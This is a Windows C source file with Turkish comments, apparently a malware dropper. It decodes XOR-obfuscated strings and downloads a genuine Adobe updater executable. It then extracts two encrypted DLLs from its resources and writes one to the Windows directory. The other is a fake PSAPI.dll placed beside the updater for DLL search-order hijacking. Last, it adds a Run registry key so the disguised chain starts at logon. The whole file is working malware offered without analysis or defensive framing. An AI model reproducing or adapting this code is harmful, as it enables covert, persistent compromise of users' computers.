#include "Header.h"
#include <Shlwapi.h>

#pragma comment(lib, "Urlmon.lib")
#pragma comment(lib, "shlwapi.lib")

#define SVCHKEY	HKEY_CURRENT_USER
#define HIJACKED_DLL TEXT("PSAPI.dll")

BOOL SetRegValue(PTSTR szNewPath);
BOOL DosyaYaz(PTSTR lpszFileName, LPVOID lpData, DWORD dwSize);
LPVOID KaynakGetir(PTSTR szKaynakIsmi, LPDWORD lpdwBoyut);
PTCHAR ComputePath(PTSTR szEnvVar, PTSTR szEkPath);
void XorEncodeAdv(PBYTE pbVeri, DWORD dwSize, PBYTE bSifre, DWORD dwSifreSize);
PTSTR XorDecodeBsc(PTSTR szVeri);

int WINAPI WinMain(HINSTANCE hInstance,	HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
	//encode decode..
	//PTSTR szUsername = XorEncodeBsc((PTSTR)e_szUsername);
	PTSTR szUrl = NULL, szExeFilename = NULL, szPathEnvVar = NULL, szEkPath = NULL;
	PTSTR szNewPath = NULL;	
	TCHAR szLegitExePath[MAX_PATH], szHookDllPath[MAX_PATH], szHijackedDllPath[MAX_PATH];
	 
	// program ismi kontrolü
	CHAR lpThisExePath[MAX_PATH];
	DWORD dwSize = MAX_PATH*2;

	if (!GetModuleFileNameA(NULL, lpThisExePath, dwSize))
		goto temizle;

	PCHAR szRealExeName = StrRChrA(lpThisExePath, NULL, '\\') + 1;
	
	if (strcmp(szRealExeName, EXENAME))
		goto temizle;

	//kaynaklardan iki dll dosyasını çıkar ve AdobeARM.exe dosyasını internetten indir, şifreli şekilde indir
	//internet adresleri tabiki şifreli
	//download  AdobeARM.exe (şifre yok) nereye koyacaz?

	// szNewPath = ComputePath(L"Appdata", L"/Adobe/ARM/1.0/");
	szPathEnvVar = XorDecodeBsc(PATHENVVAR);
	szEkPath = XorDecodeBsc(EXTRAPATH);
	szNewPath = ComputePath(szPathEnvVar, szEkPath);
	if (szNewPath == NULL){
		HATA(L"KTOL ComputePath", szPathEnvVar);
		goto temizle;
	}
	
	// legit dosyayı kopyalayacağımız yol mevcut değil ise oluştur
	if (!PathFileExists(szNewPath))
	if (!CreateDirectory(szNewPath, NULL)){
		//printf("CreateDirectory Failed. Cannot install program (%d)\n", GetLastError());
		HATA(L"KTOL: CreateDirectory",szNewPath);
		goto temizle;
	}

	// path e dosya ismini ekle
	szExeFilename = XorDecodeBsc(ADOBEEXE);
	StringCchCopy(szLegitExePath, MAX_PATH, szNewPath);
	StringCchCat(szLegitExePath, MAX_PATH, szExeFilename);
	// internetten legit exe dosyayı indir
	szUrl = XorDecodeBsc(ADOBEURL);
	HRESULT hRes = URLDownloadToFile(NULL, szUrl, szLegitExePath, NULL, NULL);

	if (hRes != S_OK){
		HATA(L"KTOL: URLDownloadToFile", szUrl);
		goto temizle;
	}

	//resource dan verileri al, decode et, dosya olarak yaz
	//**********************************************************************
	WORD index = 0;
	DWORD dwSize1 = 0, dwSize2 = 0;
	PVOID pVeri1 = KaynakGetir(MAKEINTRESOURCE(index++), &dwSize1);
	if (pVeri1 == NULL){
		HATA(L"KTOL: KaynakGetir" , MAKEINTRESOURCE(index));
		goto temizle;
	}

	PVOID pVeri2 = KaynakGetir(MAKEINTRESOURCE(index++), &dwSize2);
	if (pVeri2 == NULL){
		HATA(L"KTOL: KaynakGetir", MAKEINTRESOURCE(index));
		goto temizle;
	}

	PSTR szrRscDecodeKey = RSCKEY;
	XorEncodeAdv((LPBYTE)pVeri1, dwSize1, (PBYTE)szrRscDecodeKey, strlen(szrRscDecodeKey) - 10);
	XorEncodeAdv((LPBYTE)pVeri2, dwSize2, (PBYTE)szrRscDecodeKey + 10, strlen(szrRscDecodeKey) - 10);
	// ilk önce windows un altına, sonra adobe nin yanına dll ekleme..
	// path e dosya ismini ekle
	//szNewPath1 = ComputePath(TEXT("SystemRoot"), L"");
	ZeroMemory(szHookDllPath, MAX_PATH);
	if (!GetWindowsDirectory(szHookDllPath, MAX_PATH)){
		HATA(L"KTOL: GetWindowsDirectory", TEXT("GetWindowsDirectory"));
		goto temizle;
	}

	/*if (szNewPath1 == NULL){
		HATA(L"KTOL: ComputePath", TEXT("SystemRoot"));
		goto temizle;
	}*/

	StringCchCat(szHookDllPath, MAX_PATH, L"\\");
	StringCchCat(szHookDllPath, MAX_PATH, HOOK_DLL);
	if (!DosyaYaz(szHookDllPath, pVeri1, dwSize1)){
		goto temizle;
	}
	
	// ikinci olarak HIJACKED_DLL dll in yazılması 
	StringCchCopy(szHijackedDllPath, MAX_PATH, szNewPath);
	StringCchCat(szHijackedDllPath, MAX_PATH, HIJACKED_DLL);
	if (!DosyaYaz(szHijackedDllPath, pVeri2, dwSize2)){
		goto temizle;
	}

	// registry autorun ayarını yap
	if (!SetRegValue(szLegitExePath)){
		HATA(L"KTOL: SetRegValue", szLegitExePath);
		goto temizle;
	}

temizle:
	free(szNewPath);
	//free(szNewPath1);
	free(szUrl);
	free(szExeFilename);
	free(szPathEnvVar);
	free(szEkPath);

	return 0;
}

BOOL SetRegValue(PTSTR szNewPath){
	BOOL bSuccess = FALSE;
	//ilgili registry değerini hazırla
	HKEY hk;
	DWORD dwDisp;
	PTSTR szSubkey = XorDecodeBsc(SUBKEY);
	PTSTR szKeyvalue = XorDecodeBsc(KEYVALUE);
	//Adobe ARM	Adobe Reader and Acrobat Manager	(Verified) Adobe Systems	c:\program files (x86)\common files\adobe\arm\1.0\adobearm.exe	11/21/2013 7:56 PM
	//HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run				

	//counter resgitry değerinin oluşturma işlemi	
	if (RegCreateKeyEx(SVCHKEY, szSubkey,
		0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hk, &dwDisp)){
		HATA(L"KTOL: RegCreateKeyEx", szSubkey);
		goto temizle;
	}

	// ilk değeri atayalım
	if (RegSetValueEx(hk,             // subkey handle 
		szKeyvalue,        // value name 
		0,                         // must be zero 
		REG_SZ,             // value type 
		(LPBYTE)szNewPath,          // pointer to value data 
		(lstrlen(szNewPath) + 1) * 2)) // data size
	{
		HATA(L"KTOL: RegSetValueEx", szKeyvalue);
		RegCloseKey(hk);
		goto temizle;
	}

	bSuccess = TRUE;

temizle:
	//reg set islemi bitti
	RegCloseKey(hk);
	return bSuccess;
}

BOOL DosyaYaz(PTSTR lpszFileName, LPVOID lpData, DWORD dwSize){
	HANDLE hLibFile = NULL;
	BOOL bSuccess = FALSE;

	//yeni dosyayı oluştur
	hLibFile = CreateFile(lpszFileName, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_SYSTEM, NULL);
	if (hLibFile == INVALID_HANDLE_VALUE){
		return FALSE;
	}

	DWORD dwWritten = 0;
	if (!WriteFile(hLibFile, lpData, dwSize, &dwWritten, NULL) || dwSize != dwWritten){
		//DWORD err = GetLastError();
		goto temizle;
	}

	bSuccess = TRUE;

temizle:
	CloseHandle(hLibFile);

	return bSuccess;
}

//başarısız olursa NULL dönecektir
LPVOID KaynakGetir(PTSTR szKaynakIsmi, LPDWORD lpdwBoyut){
	HGLOBAL hResLoad;   // handle to loaded resource	
	HRSRC hRes;         // handle/ptr. to res. info. in hExe
	LPVOID lpResLock = NULL;   // pointer to resource data
	//BOOL bSuccess = FALSE;
	//DWORD dwSizeOfRes; //size of resource

	// Locate the dialog box resource in the .EXE file.
	hRes = FindResource(NULL, szKaynakIsmi, RT_RCDATA);
	if (hRes == NULL)
	{
		//ErrorHandler(TEXT("Could not locate dialog box."));
		HATA(L"KTOL: KaynakGetir", L"FindResource");
		goto temizle;
	}

	// Load the dialog box into global memory.
	hResLoad = LoadResource(NULL, hRes);
	if (hResLoad == NULL)
	{
		//ErrorHandler(TEXT("Could not load dialog box."));
		HATA(L"KTOL: KaynakGetir", L"LoadResource");
		goto temizle;
	}

	// Lock the dialog box into global memory.
	lpResLock = LockResource(hResLoad);
	if (lpResLock == NULL)
	{
		//ErrorHandler(TEXT("Could not lock dialog box."));
		HATA(L"KTOL: KaynakGetir", L"LockResource");
		goto temizle;
	}

	//boyutu ogren
	*lpdwBoyut = SizeofResource(NULL, hRes);
	if (*lpdwBoyut == 0){
		lpResLock = NULL;
		goto temizle;
	}

temizle:
	return lpResLock;
}

//sonuc adres boşaltmalı
//başarısız olursa NULL dönecektir
PTCHAR ComputePath(PTSTR szEnvVar, PTSTR szEkPath){
	PTCHAR pPath = NULL;//bu dosyanýn full pathi için
	//envVariable size 
	DWORD nSize = 0;
	//dosya yolunu hesaplamak ve tutmak için
	PTCHAR pszPath1 = NULL;

	//veriyi tutmak için gerekli olan boyutu bul
	nSize = GetEnvironmentVariable(szEnvVar, NULL, NULL);
	if (nSize == 0){
		HATA(L"KTOL: ComputePath", L"GetEnvironmentVariable");
		goto Cleanup;
	}
	//öğrenilen boyutta yer aç
	pszPath1 = (PTCHAR)malloc(nSize * sizeof(TCHAR)); //temizleme lazım	
	//veriyi al
	nSize = GetEnvironmentVariable(szEnvVar, pszPath1, nSize);
	if (nSize == 0){
		HATA(L"KTOL: ComputePath", L"GetEnvironmentVariable");
		goto Cleanup;
	}

	//verinin koyulacağı yeri ayarla
	pPath = (PTCHAR)malloc(MAX_PATH * sizeof(TCHAR));
	ZeroMemory(pPath, MAX_PATH * sizeof(TCHAR));

	//stringleri birbirine ekleme işlemi
	//ilk kısmı ekle
	StringCchCat(pPath, MAX_PATH, pszPath1);
	//ikinci kısmı ekle
	StringCchCat(pPath, MAX_PATH, L"\\");
	StringCchCat(pPath, MAX_PATH, szEkPath);
	StringCchCat(pPath, MAX_PATH, L"\\");

Cleanup:
	free(pszPath1);

	return pPath;
}

void XorEncodeAdv(PBYTE pbVeri, DWORD dwSize, PBYTE bSifre, DWORD dwSifreSize){
	for (DWORD i = 0; i < dwSize; i++)
	if (pbVeri[i] != 0 && pbVeri[i] != bSifre[i % dwSifreSize])
		pbVeri[i] = pbVeri[i] ^ bSifre[i % dwSifreSize];
}

//sonuc adres boşaltmalı, sadece decode işlemi için
PTSTR XorDecodeBsc(PTSTR szVeri){
	int i = 0;
	DWORD dwSize = (lstrlen(szVeri) + 1) * sizeof(TCHAR);
	//gelen veri de en az iki karakter olsun...
	if (dwSize < sizeof(TCHAR)* 3)
		return NULL;

	PTSTR szResult = (PTSTR)malloc(dwSize);
	ZeroMemory(szResult, dwSize);

	szResult[0] = szVeri[0] ^ 0xFF;

	// TCHAR sifre = (szResult[0] > 0xFF / 2) ? szResult[0] : szVeri[0];
	TCHAR sifre = szResult[0]; // sadece decode işlemi için

	while (szVeri[++i] != 0)
		szResult[i] = szVeri[i] ^ sifre;

	return szResult;
}

